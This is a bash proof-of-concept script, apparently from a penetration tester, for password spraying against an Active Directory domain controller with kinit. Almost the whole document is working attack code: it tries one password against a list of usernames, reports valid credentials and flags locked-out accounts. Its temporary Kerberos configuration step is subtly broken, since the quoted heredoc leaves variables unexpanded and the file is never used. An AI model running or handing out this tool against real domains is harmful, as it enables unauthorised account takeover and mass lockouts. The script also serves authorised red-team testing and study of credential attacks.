#!/bin/bash

# Title: kinit_user_brute.sh
# Author: @ropnop
# Description: This is a PoC for doing horiztonal password sprays using 'kinit' to try to check out a TGT from a Domain Controller
# The script configures the realm and KDC for you based on the domain provided and the domain controller
# Since this configuration is only temporary though, if you want to actually *use* the TGT you should actually edit /etc/krb5.conf
# Only tested with Heimdal kerberos (error messages might be different for MIT clients)


DOMAIN=$1
DOMAINCONTROLLER=$2
WORDLIST=$3
PASSWORD=$4

if [[ $# -ne 4 ]]; then
	echo "[!] Usage: ./kinit_user_brute.sh <domain> <domain controller> <username list> <password>"
	echo "[!] Example: ./kinit_user_brute.sh contoso.com dc1.contoso.com usernames.txt Password123"
	exit 1
fi

DOMAIN=$(echo $DOMAIN | awk '{print toupper($0)}')

echo "[+] Kerberos Realm: $DOMAIN"
echo "[+] KDC: $DOMAINCONTROLLER"
echo ""

KRB5_CONF=$(mktemp)

cat > $KRB5_CONF <<'asdfasdf'
[libdefaults]
	default_realm = $DOMAIN
[realms]
	$DOMAIN = {
		kdc = $DOMAINCONTROLLER
		admin_server = $DOMAINCONTROLLER
	}
asdfasdf

START_TIME=$SECONDS
COUNT=0

while read USERNAME; do
	USERNAME=$(echo $USERNAME | awk -F@ '{print $1}')
	RESULT=$(
	echo $PASSWORD | kinit --password-file=STDIN $USERNAME 2>&1
	)
	if [[ $RESULT == *"unable to reach"* ]]; then
		echo "[!] Unable to find KDC for realm. Check domain and DC"
		exit 1
	elif [[ $RESULT == *"Wrong realm"* ]]; then
	       echo "[!] Wrong realm. Make sure domain and DC are correct"
     	       exit 1
	elif [[ $RESULT == *"Clients credentials have been revoked"* ]]; then
		echo "[!] $USERNAME is locked out!"
	elif [[ $RESULT == *"Client"* ]] && [[ $RESULT == *"unknown"* ]]; then
		# username does not exist
		: # pass
	elif [[ -z "$RESULT" ]]; then
		echo "[+] Valid: $USERNAME@$DOMAIN : $PASSWORD"
	else
		echo "[+] Error trying $USERNAME: $RESULT"
	fi
	COUNT=$(($COUNT+1))
done <$WORDLIST

echo ""
echo "Tested \"$PASSWORD\" against $COUNT users in $(($SECONDS - $START_TIME)) seconds"
echo ""
